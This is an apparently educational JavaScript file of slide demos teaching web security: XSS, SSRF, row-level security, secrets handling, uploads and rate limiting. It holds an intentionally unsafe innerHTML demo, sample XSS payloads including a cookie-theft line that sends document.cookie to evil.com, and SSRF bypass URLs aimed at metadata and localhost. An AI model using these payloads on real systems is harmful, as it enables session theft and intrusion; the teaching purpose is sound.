// Slide demo functions

// Frontend vs Backend Demo
function initFrontendBackendDemo() {
  const checkoutBtn = document.getElementById('checkoutBtn');
  if (!checkoutBtn) return;

  let attempts = 0;
  
  checkoutBtn.addEventListener('click', () => {
    attempts++;
    const status = document.querySelector('#frontendBackendDemo .demo-status');
    
    if (checkoutBtn.disabled) {
      // This shouldn't happen normally, but DevTools can bypass
      status.innerHTML = `<span class="warning">⚠️ Button was disabled, but click went through! (Attempt ${attempts})</span>`;
    } else {
      status.innerHTML = `<span class="success">✅ Server validated: Payment processed! But in real life, server should check permissions regardless of UI state. (Attempt ${attempts})</span>`;
    }
    
    // Show the security lesson
    setTimeout(() => {
      status.innerHTML += `<br><strong>Security lesson:</strong> Always validate on the server, never trust the client!`;
    }, 1000);
  });

  // Show instructions
  const instructions = document.createElement('div');
  instructions.className = 'demo-instructions';
  instructions.innerHTML = `
    <p><strong>Try this:</strong></p>
    <ol>
      <li>Right-click the button → Inspect Element</li>
      <li>Remove the <code>disabled</code> attribute</li>
      <li>Click the button</li>
    </ol>
  `;
  checkoutBtn.parentNode.appendChild(instructions);
}

// Secrets Scanner Demo
function initSecretsDemo() {
  const secretInfo = document.querySelector('#secretsDemo .secret-info');
  if (!secretInfo) return;

  const secretData = {
    'supabase-public': {
      title: 'Supabase Anon Key',
      location: '✅ SAFE with VITE_',
      explanation: 'Public by design. Use VITE_ prefix so it gets bundled to frontend. Protected by RLS policies.',
      example: 'VITE_SUPABASE_ANON_KEY=eyJh...VCJ9',
      color: 'success'
    },
    'supabase-service': {
      title: 'Supabase Service Role Key',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Bypasses all RLS! Keep in server .env file only (no VITE_ prefix).',
      example: 'SUPABASE_SERVICE_ROLE_KEY=eyJh...VCJ9',
      color: 'error'
    },
    'stripe-public': {
      title: 'Stripe Public Key',
      location: '✅ SAFE with VITE_',
      explanation: 'Starts with pk_. Can only create payment intents, not charge. Use VITE_ prefix.',
      example: 'VITE_STRIPE_PUBLIC_KEY=pk_test_51H...',
      color: 'success'
    },
    'stripe-secret': {
      title: 'Stripe Secret Key',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Starts with sk_. Can charge cards! Keep server-only (no VITE_ prefix).',
      example: 'STRIPE_SECRET_KEY=sk_test_51H...',
      color: 'error'
    },
    'google-maps': {
      title: 'Google Maps API Key',
      location: '⚠️ VITE_ + domain restrictions',
      explanation: 'Can use VITE_ prefix BUT must restrict to your domain in Google Console.',
      example: 'VITE_GOOGLE_MAPS_KEY=AIza...WK',
      color: 'warning'
    },
    'jwt-secret': {
      title: 'JWT Signing Secret',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Signs auth tokens. If leaked, anyone can fake users! Server .env only.',
      example: 'JWT_SECRET=your-256-bit...',
      color: 'error'
    }
  };

  window.showSecretInfo = function(secretType) {
    const data = secretData[secretType];
    if (!data) return;

    // Clear previous selections
    document.querySelectorAll('.secret-card').forEach(card => {
      card.classList.remove('selected');
    });
    
    // Mark current selection
    document.querySelector(`[data-secret="${secretType}"]`).classList.add('selected');

    secretInfo.innerHTML = `
      <div class="secret-details ${data.color}">
        <h4>${data.title}</h4>
        <div class="location">${data.location}</div>
        <p>${data.explanation}</p>
        <div class="example">
          <strong>Example:</strong>
          <code>${data.example}</code>
        </div>
      </div>
    `;
  };
}

// RLS Demo
function initRLSDemo() {
  let databaseRecords = []; // All records in the "database"
  let recordIdCounter = 1;
  
  const dataInput = document.querySelector('#rlsDemo #dataInput');
  const dataOwner = document.querySelector('#rlsDemo #dataOwner');
  const tableBody = document.querySelector('#rlsDemo #tableBody');
  const currentUser = document.querySelector('#rlsDemo #currentUser');
  const rlsEnabled = document.querySelector('#rlsDemo #rlsEnabled');
  const resultsBody = document.querySelector('#rlsDemo #resultsBody');
  const sqlDisplay = document.querySelector('#rlsDemo #sqlDisplay');
  const securityWarning = document.querySelector('#rlsDemo #securityWarning');
  const resultsTitle = document.querySelector('#rlsDemo #resultsTitle');
  
  if (!dataInput || !tableBody) return;

  function formatTime(date) {
    return date.toLocaleTimeString('en-US', { 
      hour12: false, 
      hour: '2-digit', 
      minute: '2-digit',
      second: '2-digit'
    });
  }

  function updateDatabaseTable() {
    tableBody.innerHTML = databaseRecords.map(record => 
      `<tr>
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`
    ).join('');
  }

  function updateQueryResults() {
    const user = currentUser.value;
    const rlsOn = rlsEnabled.checked;
    
    let visibleRecords;
    let sqlQuery;
    
    if (rlsOn) {
      // RLS filters automatically
      visibleRecords = databaseRecords.filter(record => record.owner === user);
      sqlQuery = `SELECT * FROM notes WHERE owner = '${user}'; -- RLS automatically adds this filter`;
    } else {
      // No RLS - all records visible (security vulnerability!)
      visibleRecords = databaseRecords;
      sqlQuery = `SELECT * FROM notes; -- ⚠️ NO FILTERING - ALL DATA EXPOSED!`;
    }
    
    // Update SQL display
    sqlDisplay.innerHTML = `<code>${sqlQuery}</code>`;
    
    // Update results table
    resultsBody.innerHTML = visibleRecords.map((record, index) => {
      const isOwnRecord = record.owner === user;
      const rowClass = rlsOn ? (isOwnRecord ? 'accessible' : 'blocked') : (isOwnRecord ? 'own-record' : 'exposed-record');
      
      return `<tr class="${rowClass}">
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`;
    }).join('');
    
    // Update title and warnings
    if (rlsOn) {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - RLS Protected`;
      securityWarning.style.display = 'none';
    } else {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - NO RLS PROTECTION`;
      const exposedRecords = visibleRecords.filter(record => record.owner !== user);
      if (exposedRecords.length > 0) {
        securityWarning.style.display = 'block';
        securityWarning.innerHTML = `
          <strong>🚨 SECURITY VULNERABILITY!</strong><br>
          User "${user}" can see ${exposedRecords.length} record(s) belonging to other users!<br>
          This is why RLS is essential for data protection.
        `;
      } else {
        securityWarning.style.display = 'none';
      }
    }
  }

  window.addDatabaseRecord = function() {
    if (!dataInput || !dataOwner) return;
    const data = dataInput.value.trim();
    if (!data) return;
    
    const record = {
      id: recordIdCounter++,
      owner: dataOwner.value,
      data: data,
      created: new Date()
    };
    
    databaseRecords.push(record);
    dataInput.value = '';
    
    updateDatabaseTable();
    // Don't auto-update query results - user must click query button
  };

  window.runQuery = function() {
    updateQueryResults();
  };

  window.resetDatabase = function() {
    databaseRecords = [];
    recordIdCounter = 1;
    updateDatabaseTable();
    
    // Reset query results to initial state
    resultsTitle.textContent = 'Query Results';
    sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
    resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
    securityWarning.style.display = 'none';
  };

  // Add Enter key support
  if (dataInput) {
    dataInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        addDatabaseRecord();
      }
    });
  }

  // Remove real-time updates - only update when query button is clicked

  // Initialize with some sample data
  databaseRecords = [
    { id: 1, owner: 'User A', data: 'My secret project notes', created: new Date(Date.now() - 120000) },
    { id: 2, owner: 'User B', data: 'Personal diary entry', created: new Date(Date.now() - 60000) }
  ];
  recordIdCounter = 3;
  
  updateDatabaseTable();
  
  // Initialize query results area with prompt to run query
  resultsTitle.textContent = 'Query Results';
  sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
  resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
  securityWarning.style.display = 'none';
}

// XSS Demo (Enhanced from existing)
function initXSSDemo() {
  const input = document.getElementById('xssInput');
  const output = document.getElementById('xssOut');
  const btnInsecure = document.getElementById('btnInsecure');
  const btnSecure = document.getElementById('btnSecure');
  const btnClear = document.getElementById('btnClear');
  
  if (!input || !output) return;

  btnInsecure?.addEventListener('click', () => {
    // Intentionally unsafe for demo
    const userInput = input.value;
    output.innerHTML = userInput;
    output.className = 'xss-output insecure';
    
    // Simulate XSS execution for demo purposes
    // Check if input contains XSS patterns and simulate their execution
    if (userInput.includes('<script>') || userInput.includes('onerror=') || userInput.includes('onload=') || userInput.includes('document.cookie') || userInput.includes('fetch(')) {
      // Add visual indicator that XSS would have executed
      setTimeout(() => {
        // Show XSS execution warning
        const xssWarning = document.createElement('div');
        xssWarning.className = 'xss-executed';
        
        // Check if it's a cookie theft attack for specific warning
        let warningMessage = '🚨 XSS EXECUTED! In a real app, malicious code would run here! 🚨';
        if (userInput.includes('document.cookie') || userInput.includes('fetch(')) {
          warningMessage = '🍪 COOKIE THEFT ATTACK! Session cookies would be stolen and sent to evil.com! 🚨';
        }
        
        xssWarning.innerHTML = warningMessage;
        xssWarning.style.cssText = `
          background: red; 
          color: white; 
          padding: 10px; 
          border: 2px solid darkred; 
          border-radius: 5px; 
          margin: 10px 0; 
          animation: pulse 1s infinite;
          font-weight: bold;
        `;
        output.appendChild(xssWarning);
        
        // Simulate page background flash
        document.body.style.backgroundColor = '#ff000033';
        setTimeout(() => {
          document.body.style.backgroundColor = '';
        }, 1000);
        
        // Show alert after visual effects
        setTimeout(() => {
          alert('🚨 XSS Attack Simulated! In a real application, malicious JavaScript would have executed.');
        }, 500);
        
      }, 100);
    }
  });

  btnSecure?.addEventListener('click', () => {
    // Safe text content
    output.textContent = input.value;
    output.className = 'xss-output secure';
  });

  btnClear?.addEventListener('click', () => {
    input.value = '';
    output.textContent = '';
    output.className = '';
  });

  // Add sample XSS payloads
  const samplesDiv = document.createElement('div');
  samplesDiv.className = 'xss-samples';
  samplesDiv.innerHTML = `
    <details>
      <summary>Sample XSS Payloads (for testing)</summary>
      <div class="sample-buttons">
        <button type="button" data-payload="image">Image XSS</button>
        <button type="button" data-payload="script">Script Tag</button>
        <button type="button" data-payload="svg">SVG XSS</button>
        <button type="button" data-payload="cookie">Cookie Theft</button>
      </div>
    </details>
  `;
  
  // Add event listeners for sample buttons
  const sampleButtons = samplesDiv.querySelectorAll('button[data-payload]');
  sampleButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const payload = btn.dataset.payload;
      switch(payload) {
        case 'image':
          input.value = '<img src=x onerror="this.style.backgroundColor=\'red\'; this.style.width=\'200px\'; this.style.height=\'50px\'; this.innerHTML=\'🚨 XSS EXECUTED! 🚨\';">';
          break;
        case 'script':
          input.value = '<script>document.body.style.backgroundColor="red"; setTimeout(() => document.body.style.backgroundColor="", 2000);</script>';
          break;
        case 'svg':
          input.value = '<svg onload="this.innerHTML=\'<text x=10 y=20 fill=red>🚨 XSS EXECUTED! 🚨</text>\'; this.style.backgroundColor=\'yellow\';" width="200" height="30">';
          break;
        case 'cookie':
          input.value = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">';
          break;
      }
    });
  });
  
  input.parentNode.appendChild(samplesDiv);
}

// Rate Limiting Demo
function initRateLimitDemo() {
  const log = document.querySelector('#rateLimitDemo .request-log');
  if (!log) return;

  let requestCount = 0;
  let isLimited = false;
  const RATE_LIMIT = 5;
  const WINDOW_MS = 10000; // 10 seconds

  window.makeRequest = function() {
    requestCount++;
    
    if (requestCount > RATE_LIMIT && !isLimited) {
      isLimited = true;
      setTimeout(() => {
        isLimited = false;
        requestCount = 0;
      }, WINDOW_MS);
    }

    const timestamp = new Date().toLocaleTimeString();
    const status = isLimited ? '429 Too Many Requests' : '200 OK';
    const statusClass = isLimited ? 'error' : 'success';
    
    const logEntry = `
      <div class="log-entry ${statusClass}">
        [${timestamp}] Request ${requestCount}: ${status}
      </div>
    `;
    
    log.innerHTML = logEntry + log.innerHTML;
    
    // Limit log entries
    const entries = log.children;
    if (entries.length > 10) {
      entries[entries.length - 1].remove();
    }
  };

  window.floodRequests = function() {
    for (let i = 0; i < 10; i++) {
      setTimeout(() => makeRequest(), i * 100);
    }
  };

  window.resetLimits = function() {
    requestCount = 0;
    isLimited = false;
    log.innerHTML = '<p class="info">Rate limits reset!</p>';
  };
}

// Headers Demo
function initHeadersDemo() {
  // Add toggle functionality for header cards
  window.toggleHeaderDetail = function(card) {
    const detail = card.querySelector('.header-detail');
    const isVisible = detail.style.display !== 'none';
    
    // Close all other details
    document.querySelectorAll('.header-card .header-detail').forEach(d => {
      d.style.display = 'none';
    });
    document.querySelectorAll('.header-card').forEach(c => {
      c.classList.remove('expanded');
    });
    
    // Toggle current one
    if (!isVisible) {
      detail.style.display = 'block';
      card.classList.add('expanded');
    }
  };

  // Modal functions
  window.openHeadersModal = function() {
    const modal = document.getElementById('headersModal');
    const analysisDiv = document.getElementById('headersAnalysis');
    
    if (!modal || !analysisDiv) return;
    
    // Generate detailed analysis
    const isFileProtocol = window.location.protocol === 'file:';
    const currentOrigin = window.location.origin;
    
    const headers = [
      {
        name: 'CSP',
        present: false,
        description: 'Content Security Policy prevents XSS attacks by controlling which scripts can run.',
        impact: 'Without CSP, malicious scripts can execute on your page, stealing user data or performing actions on their behalf.',
        icon: '✖️'
      },
      {
        name: 'HSTS',
        present: !isFileProtocol,
        description: 'HTTP Strict Transport Security forces browsers to use HTTPS connections.',
        impact: isFileProtocol ? 'Not applicable for file:// protocol.' : 'Without HSTS, attackers can downgrade connections to HTTP and intercept traffic.',
        icon: !isFileProtocol ? '✅' : '➖'
      },
      {
        name: 'X-Frame-Options',
        present: false,
        description: 'Prevents your site from being embedded in malicious iframes.',
        impact: 'Without this header, attackers can embed your site invisibly to trick users into clicking (clickjacking).',
        icon: '✖️'
      },
      {
        name: 'CORS',
        present: true,
        description: 'Cross-Origin Resource Sharing controls which domains can access your API.',
        impact: 'Currently configured to allow requests from this origin only.',
        icon: '✅'
      }
    ];
    
    const missing = headers.filter(h => !h.present).length;
    const summaryClass = missing === 0 ? 'good' : 'warning';
    const summaryText = missing === 0 
      ? '✅ All essential headers are configured!' 
      : `⚠️ ${missing} essential header${missing > 1 ? 's' : ''} missing`;
    
    analysisDiv.innerHTML = `
      <div class="headers-analysis">
        <div class="analysis-summary ${summaryClass}">
          ${summaryText}
        </div>
        
        <div class="headers-detail">
          ${headers.map(h => `
            <div class="header-analysis-item ${h.present ? 'present' : 'missing'}">
              <h4>${h.icon} ${h.name}</h4>
              <p><strong>What it does:</strong> ${h.description}</p>
              <p><strong>Security impact:</strong> ${h.impact}</p>
            </div>
          `).join('')}
        </div>
        
        <div class="origin-info-modal">
          <strong>Current Origin:</strong> <code>${currentOrigin}</code><br>
          <small>Origin = protocol + domain + port. This determines CORS and security header scope.</small>
        </div>
      </div>
    `;
    
    modal.style.display = 'flex';
    
    // Focus management for accessibility
    const closeButton = modal.querySelector('.modal-close');
    if (closeButton) closeButton.focus();
    
    // Prevent body scroll
    document.body.style.overflow = 'hidden';
  };

  window.closeHeadersModal = function() {
    const modal = document.getElementById('headersModal');
    if (!modal) return;
    
    modal.style.display = 'none';
    document.body.style.overflow = '';
  };

  // Close modal on Escape key
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      closeHeadersModal();
    }
  });
}

// File Upload Demo
function initUploadDemo() {
  const fileInput = document.getElementById('fileInput');
  const uploadStatus = document.querySelector('#uploadDemo .upload-status');
  const validationResults = document.querySelector('#uploadDemo .validation-results');
  
  if (!fileInput || !uploadStatus || !validationResults) return;

  const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/pdf'];
  const MAX_SIZE = 5 * 1024 * 1024; // 5MB

  // Magic byte signatures for common file types
  const magicBytes = {
    'image/jpeg': [0xFF, 0xD8, 0xFF],
    'image/png': [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A],
    'image/gif': [0x47, 0x49, 0x46, 0x38],
    'application/pdf': [0x25, 0x50, 0x44, 0x46],
    'exe': [0x4D, 0x5A], // MZ header for executables
  };

  function checkMagicBytes(file) {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onload = (e) => {
        const bytes = new Uint8Array(e.target.result.slice(0, 16));
        
        // Check for executable signature
        if (bytes[0] === 0x4D && bytes[1] === 0x5A) {
          resolve({ isExecutable: true, detectedType: 'executable' });
          return;
        }
        
        // Check against known good signatures
        for (const [type, signature] of Object.entries(magicBytes)) {
          if (type === 'exe') continue; // Skip exe check in good types
          const matches = signature.every((byte, i) => bytes[i] === byte);
          if (matches) {
            resolve({ isExecutable: false, detectedType: type });
            return;
          }
        }
        
        resolve({ isExecutable: false, detectedType: 'unknown' });
      };
      reader.readAsArrayBuffer(file);
    });
  }

  fileInput.addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    uploadStatus.innerHTML = `<p>Validating file: <strong>${file.name}</strong></p>`;
    
    const validations = [];
    
    // Magic byte validation (file content check)
    const magicCheck = await checkMagicBytes(file);
    const ext = file.name.split('.').pop().toLowerCase();
    
    if (magicCheck.isExecutable) {
      validations.push({ 
        check: 'Magic bytes', 
        status: 'fail', 
        message: `🚨 Executable file detected! (.${ext} → executable)` 
      });
    } else if (magicCheck.detectedType !== 'unknown') {
      validations.push({ 
        check: 'Magic bytes', 
        status: 'pass', 
        message: `Content matches ${magicCheck.detectedType}` 
      });
    } else {
      validations.push({ 
        check: 'Magic bytes', 
        status: 'warning', 
        message: `Unknown file signature` 
      });
    }
    
    // Type validation (browser MIME)
    if (ALLOWED_TYPES.includes(file.type)) {
      validations.push({ check: 'MIME type', status: 'pass', message: `${file.type} is allowed` });
    } else {
      validations.push({ check: 'MIME type', status: 'fail', message: `${file.type} is not allowed` });
    }
    
    // Size validation
    if (file.size <= MAX_SIZE) {
      validations.push({ check: 'File size', status: 'pass', message: `${(file.size / 1024 / 1024).toFixed(2)} MB is within limit` });
    } else {
      validations.push({ check: 'File size', status: 'fail', message: `${(file.size / 1024 / 1024).toFixed(2)} MB exceeds 5MB limit` });
    }
    
    // Extension check
    const suspiciousExts = ['exe', 'bat', 'cmd', 'com', 'pif', 'scr', 'vbs', 'js', 'jar'];
    if (suspiciousExts.includes(ext)) {
      validations.push({ check: 'File extension', status: 'fail', message: `${ext} files are blocked for security` });
    } else {
      validations.push({ check: 'File extension', status: 'pass', message: `${ext} extension is safe` });
    }

    const allPassed = validations.every(v => v.status === 'pass');
    const hasFail = validations.some(v => v.status === 'fail');
    
    validationResults.innerHTML = `
      <div class="validation-summary ${allPassed ? 'success' : hasFail ? 'error' : 'warning'}">
        ${allPassed ? '✅ File would be accepted' : hasFail ? '❌ File would be rejected' : '⚠️ File flagged for review'}
      </div>
      <div class="validation-details">
        ${validations.map(v => `
          <div class="validation-item ${v.status}">
            <strong>${v.check}:</strong> ${v.message}
          </div>
        `).join('')}
      </div>
    `;
  });
}

// SSRF Protection Demo
function initSSRFDemo() {
  // Helpers inside the demo scope (simulation only)
  const ALLOWED_PROTOCOLS = ['http:', 'https:'];
  const OUTBOUND_ALLOWLIST = ['example.com', 'api.myapp.com']; // demo allowlist

  function isLocalhostName(host) {
    const h = host.toLowerCase();
    return h === 'localhost' || h.endsWith('.localhost') || h === 'localdomain' || h.endsWith('.localdomain') || h === 'home.arpa' || h.endsWith('.home.arpa');
  }

  function isIPv4(host) {
    return /^\d+\.\d+\.\d+\.\d+$/.test(host);
  }

  function isPrivateIPv4(ip) {
    try {
      const parts = ip.split('.').map(n => parseInt(n, 10));
      if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return false;
      const [a, b] = parts;
      if (a === 10) return true;
      if (a === 127) return true; // loopback
      if (a === 0) return true; // this network
      if (a === 169 && b === 254) return true; // link-local
      if (a === 192 && b === 168) return true;
      if (a === 172 && b >= 16 && b <= 31) return true;
      return false;
    } catch { return false; }
  }

  function isIPv6(host) {
    return host.includes(':');
  }

  function isPrivateIPv6(host) {
    const h = host.toLowerCase();
    return h === '::1' || h.startsWith('fc') || h.startsWith('fd') || h.startsWith('fe80'); // loopback, ULA, link-local
  }

  function hasObfuscatedHost(host) {
    // Numeric-only or hex-only hostnames often encode IPs (e.g., 2130706433, 0x7f000001)
    if (/^(0x[0-9a-f]+|[0-9]+)$/i.test(host)) return true;
    // Hex dotted (0x7f.0x00.0x00.0x01) or octal dotted (0177.0.0.1)
    if (/^(0x[0-9a-f]+\.){3}0x[0-9a-f]+$/i.test(host)) return true;
    if (/^(0[0-7]+\.){3}0[0-7]+$/.test(host)) return true;
    return false;
  }

  function isAllowedByAllowlist(host) {
    const h = host.toLowerCase();
    return OUTBOUND_ALLOWLIST.some(allowed => h === allowed || h.endsWith('.' + allowed));
  }

  function defaultPort(protocol) {
    return protocol === 'https:' ? '443' : '80';
  }

  function isAllowedPort(protocol, port) {
    const p = port || defaultPort(protocol);
    return (protocol === 'https:' && p === '443') || (protocol === 'http:' && p === '80');
  }

  function simulateRedirectToPrivate(urlString) {
    // Purely educational: flag obvious redirect parameters/paths to private targets
    const patterns = [
      /redirect[^#?]*to[^#?]*localhost/i,
      /redirect[^#?]*to[^#?]*127\.0\.0\.1/i,
      /redirect[^#?]*to[^#?]*169\.254\.169\.254/i,
      /(?:[?&](?:to|target|url)=)(?:https?:\/\/)?(?:localhost|127\.0\.0\.1|169\.254\.169\.254|\[::1\])/i
    ];
    return patterns.some(rx => rx.test(urlString));
  }

  window.testSSRF = function(button) {
    const input = button.previousElementSibling;
    const results = document.querySelector('#ssrfDemo .ssrf-results');
    const urlString = input.value.trim();

    if (!urlString) {
      results.innerHTML = '<p class="warning">Please enter a URL to test!</p>';
      return;
    }

    let url;
    try {
      url = new URL(urlString);
    } catch (e) {
      results.innerHTML = '<div class="ssrf-result error">Invalid URL. Example: <code>https://example.com/api</code></div>';
      return;
    }

    const steps = [];
    let blocked = false;

    // 1) Protocol check
    const protocolOk = ALLOWED_PROTOCOLS.includes(url.protocol);
    steps.push({ status: protocolOk ? 'success' : 'error', label: 'Protocol', message: protocolOk ? `Allowed (${url.protocol.replace(':','')})` : `Blocked (${url.protocol})` });
    if (!protocolOk) blocked = true;

    // 2) Parse basics
    const hostname = url.hostname;
    const port = url.port || defaultPort(url.protocol);
    steps.push({ status: 'info', label: 'Parsed', message: `Host: <code>${hostname}</code> • Port: <code>${port}</code>` });

    // 3) Userinfo presence (phishing/userinfo trick)
    const hasUserInfo = Boolean(url.username || url.password);
    if (hasUserInfo) {
      steps.push({ status: 'warning', label: 'Userinfo', message: `Found <code>${url.username ? url.username : ''}${url.password ? ':***' : ''}@</code> — reject URLs with credentials` });
    } else {
      steps.push({ status: 'success', label: 'Userinfo', message: 'No credentials in URL' });
    }

    // 4) Allowlist
    const onAllowlist = isAllowedByAllowlist(hostname);
    steps.push({ status: onAllowlist ? 'success' : 'error', label: 'Allowlist', message: onAllowlist ? 'Host is on outbound allowlist' : 'Host is NOT on outbound allowlist' });
    if (!onAllowlist) blocked = true;

    // 5) Private network checks
    let privateHit = false;
    if (isLocalhostName(hostname)) {
      privateHit = true;
    } else if (isIPv4(hostname) && isPrivateIPv4(hostname)) {
      privateHit = true;
    } else if (isIPv6(hostname) && isPrivateIPv6(hostname)) {
      privateHit = true;
    }
    steps.push({ status: privateHit ? 'error' : 'success', label: 'Private IPs', message: privateHit ? 'Targets localhost/private/metadata range' : 'No private IP patterns detected' });
    if (privateHit) blocked = true;

    // 6) Obfuscation checks
    const obfuscated = hasObfuscatedHost(hostname);
    steps.push({ status: obfuscated ? 'warning' : 'success', label: 'Obfuscation', message: obfuscated ? 'Suspicious numeric/hex hostname' : 'No obvious obfuscation' });

    // 7) Port policy
    const portOk = isAllowedPort(url.protocol, url.port);
    steps.push({ status: portOk ? 'success' : 'error', label: 'Port', message: portOk ? `Allowed port (${port})` : `Blocked non-standard port (${port})` });
    if (!portOk) blocked = true;

    // 8) Redirect safety (simulated)
    const redirectTrap = simulateRedirectToPrivate(urlString);
    steps.push({ status: redirectTrap ? 'error' : 'success', label: 'Redirects', message: redirectTrap ? 'Simulated: would redirect to private IP' : 'No private redirect patterns detected' });
    if (redirectTrap) blocked = true;

    // Final decision
    const decision = blocked ? 'error' : 'success';
    const decisionText = blocked ? '❌ Request would be BLOCKED' : '✅ Request would be ALLOWED';

    results.innerHTML = `
      <div class="ssrf-result ${decision}">${decisionText}</div>
      <div class="ssrf-steps">
        ${steps.map(s => `<div class="rls-result ${s.status}"><strong>${s.label}:</strong> <span>${s.message}</span></div>`).join('')}
      </div>
      <div class="security-note">Key: Allowlist exact hosts, permit only http/https on standard ports, block private IPs (IPv4/IPv6), and reject redirects to private ranges.</div>
    `;
  };

  // Add sample URLs (safe and unsafe)
  const container = document.querySelector('#ssrfDemo');
  if (!container) return; // Safety check
  const samples = document.createElement('div');
  samples.className = 'ssrf-samples';
  samples.innerHTML = `
    <p><strong>Try these:</strong></p>
    <div class="sample-buttons">
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://169.254.169.254/latest/meta-data/'">AWS Metadata</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://localhost:3000/admin'">Localhost</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://127.0.0.1'">127.0.0.1</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://[::1]/'">IPv6 ::1</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://2130706433/'">Decimal 2130706433</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://0x7f000001/'">Hex 0x7f000001</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://localhost@evil.com/'">Userinfo Trick</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'gopher://example.com'">gopher://</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://example.com:8080'">Port 8080</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://example.com/redirect-to-localhost'">Redirect Trap (simulated)</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://example.com/api'">Allowed: example.com</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://api.myapp.com/v1/data'">Allowed: api.myapp.com</button>
    </div>
  `;
  container.appendChild(samples);
}

// RLS Testing Demo
function initRLSTestingDemo() {
  window.runRLSTest = function() {
    const output = document.querySelector('#rlsTestDemo .test-output');
    if (!output) return;

    output.innerHTML = '<div class="loading">Running RLS tests...</div>';
    
    // Simulate the 3-step test
    const steps = [
      { step: 1, description: 'Creating test users A and B...', delay: 1000 },
      { step: 2, description: 'Testing User A permissions...', delay: 2000 },
      { step: 3, description: 'Testing User B permissions...', delay: 3000 },
      { step: 4, description: 'Analyzing results...', delay: 4000 }
    ];

    steps.forEach(({ step, description, delay }) => {
      setTimeout(() => {
        if (step < 4) {
          output.innerHTML += `<div class="test-step">Step ${step}: ${description}</div>`;
        } else {
          // Final results
          const results = Math.random() > 0.5 ? 'pass' : 'fail';
          output.innerHTML += `
            <div class="test-results ${results}">
              <h4>Test Results:</h4>
              ${results === 'pass' ? `
                <div class="result-item success">✅ User A can read/write own data</div>
                <div class="result-item success">✅ User A cannot read User B's data</div>
                <div class="result-item success">✅ User B can read/write own data</div>
                <div class="result-item success">✅ User B cannot read User A's data</div>
                <p class="conclusion success">🎉 RLS is working correctly!</p>
              ` : `
                <div class="result-item success">✅ User A can read/write own data</div>
                <div class="result-item error">❌ User A can read User B's data</div>
                <div class="result-item success">✅ User B can read/write own data</div>
                <div class="result-item error">❌ User B can read User A's data</div>
                <p class="conclusion error">⚠️ RLS policies need fixing!</p>
              `}
            </div>
          `;
        }
      }, delay);
    });
  };
}

// Mindset Demo
function initMindsetDemo() {
  // Make sure the function is globally available
  if (typeof window !== 'undefined') {
    window.showThinking = function(type) {
      const output = document.getElementById('thinkingOutput');
      if (!output) {
        console.log('thinkingOutput element not found');
        return;
      }
      
      console.log('showThinking called with type:', type);
      
      if (type === 'developer') {
        output.innerHTML = `
          <div class="thinking-result developer">
            <h4>👨‍💻 Developer Perspective:</h4>
            <ul>
              <li>"User clicks button → item gets added to cart"</li>
              <li>"Need to update the cart count in the UI"</li>
              <li>"Make sure the button doesn't double-click"</li>
              <li>"Check if item is in stock"</li>
            </ul>
            <p class="thinking-note">Focus: Functionality and user experience</p>
          </div>
        `;
      } else if (type === 'attacker') {
        output.innerHTML = `
          <div class="thinking-result attacker">
            <h4>🔥 Attacker Perspective:</h4>
            <ul>
              <li>"Can I add negative quantities to get money back?"</li>
              <li>"What if I change the product ID to something expensive?"</li>
              <li>"Can I add items that don't exist or are deleted?"</li>
              <li>"What if I spam this 1000 times per second?"</li>
              <li>"Can I add items for other users' carts?"</li>
              <li>"What happens if I modify the price in the request?"</li>
            </ul>
            <p class="thinking-note danger">Focus: How to exploit and break the system</p>
          </div>
        `;
      }
    };
  }
}

// Initialize all demos
function initAllDemos() {
  // Wait for DOM to be ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(initAllDemos, 100);
    });
    return;
  }

  initMindsetDemo();
  initFrontendBackendDemo();
  initSecretsDemo();
  initRLSDemo();
  initXSSDemo();
  initRateLimitDemo();
  initHeadersDemo();
  initUploadDemo();
  initSSRFDemo();
  initRLSTestingDemo();
}